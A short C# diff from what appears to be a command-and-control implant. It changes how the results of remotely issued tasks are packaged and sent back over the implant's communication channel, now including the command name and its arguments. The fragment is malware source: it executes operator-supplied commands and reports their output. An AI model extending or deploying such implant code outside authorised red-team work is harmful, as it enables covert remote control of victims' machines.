@@ -34,8 +34,8 @@ namespace Implant
             proc.Dispose();
         }
 
-        public static void SendTaskOut(string _id, string _out) {
-            var taskOut = new ImplantTaskOut { Id = _id, TaskOut = _out };
+        public static void SendTaskOut(ImplantTask task, string _id, string _out) {
+            var taskOut = new ImplantTaskOut { Id = _id, TaskName = task.Command, TaskArgs = task.Args,TaskOut = _out };
             _comms.DataSend(taskOut);
         }
 
@@ -45,9 +45,9 @@ namespace Implant
             try
             {
                 var _out = command.Execute(task);
-                SendTaskOut(task.Id, _out);
+                SendTaskOut(task, task.Id, _out);
             } catch (Exception e) { 
-                SendTaskOut(task.Id, e.Message);
+                SendTaskOut(task, task.Id, e.Message);
             }
         }
 
